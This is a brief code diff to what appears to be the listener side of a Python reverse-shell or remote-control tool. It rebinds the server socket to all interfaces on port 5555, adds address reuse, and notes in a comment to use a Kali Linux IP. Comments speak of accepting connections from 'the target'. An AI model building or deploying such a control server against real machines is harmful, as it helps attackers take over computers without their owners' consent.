@@ -303,11 +303,15 @@ def target_communication():
 # Create a socket for the server
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
-sock.bind(('192.168.1.12', 5555))
+# Allow socket reuse to prevent "Address already in use" error
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+# Bind the socket to listen on all interfaces and port 5555
+# CHANGE IP TO YOUR KALI LINUX IP OR USE 0.0.0.0 to listen on all interfaces
+sock.bind(('0.0.0.0', 5555))  # Listen on all interfaces
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections')
+print('[+] Listening For The Incoming Connections on port 5555')
 sock.listen(5)
 
 # Accept incoming connection from the target and obtain the target's IP address.
